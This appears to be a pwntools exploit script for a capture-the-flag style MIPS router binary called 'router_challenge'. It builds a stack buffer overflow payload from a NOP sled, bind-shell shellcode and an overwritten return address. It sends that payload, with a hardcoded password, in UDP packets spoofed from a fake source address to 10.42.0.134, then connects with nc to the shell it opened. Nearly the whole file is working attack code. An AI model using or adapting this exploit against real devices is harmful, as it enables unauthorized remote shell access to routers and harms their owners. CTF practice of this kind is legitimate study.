#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./router_challenge
from pwn import *
import math
import scapy.all as sc


# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './router_challenge')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
else:
    library_path = libcdb.download_libraries('ld-uClibc.so.0')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('ld-uClibc.so.0')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def send_packet(payload):
    A = '1.1.1.1' # spoofed source IP address
    B = '10.42.0.134' # destination IP address
    C = 10000 # source port
    D = 7532 # destination port
    spoofed_packet = sc.IP(src=A, dst=B) / sc.UDP(sport=C, dport=D) / payload
    print(spoofed_packet)
    sc.send(spoofed_packet)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     mips-32-big
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        PIE enabled
# Stack:      Executable
# RWX:        Has RWX segments
# Stripped:   No

# io = remote("10.42.0.134", 7532, typ="udp")
#io = remote("127.0.0.1", 7532, typ="udp")

# shellcode = asm(shellcraft.sh())
shellcode = asm(shellcraft.bindsh(7532, 'ipv4'))
passwd_payload = b"p lov2cl3an&suck"


#return address is at SP + 164 the start of our buffer is at sp + 28 so we need
# an offset of 

print(f"length of mips nop = {len(asm(shellcraft.mips.nop()))}")
bytes_required = (((600) - len(shellcode))) # 600 is arbitrary
nopsled = ((bytes_required % 4) * b"s") + (math.floor(bytes_required / 4) * asm(shellcraft.mips.nop()))

benign_payload = b"c \x00\x00\x00\x01 34"# + (nopsled) + shellcode + p32(0x004200d4 + 4)
kill_payload = b"c " + p32(round((172 - 36) / 4)) + b" "

shellcode_addr = 0x04329b4 + len(kill_payload) + 5

kill_payload += p32(shellcode_addr) + b" " + (nopsled) + shellcode

print(f"kill payload: {' '.join('{:02x}'.format(x) for x in kill_payload)}")

with open("shellcode.bin", "wb") as shellcode_dump_file:
    shellcode_dump_file.write(kill_payload)

send_packet(passwd_payload)
send_packet(kill_payload)
send_packet(b"e bye!")

# io.interactive()
os.system("nc 10.42.0.134 7532")

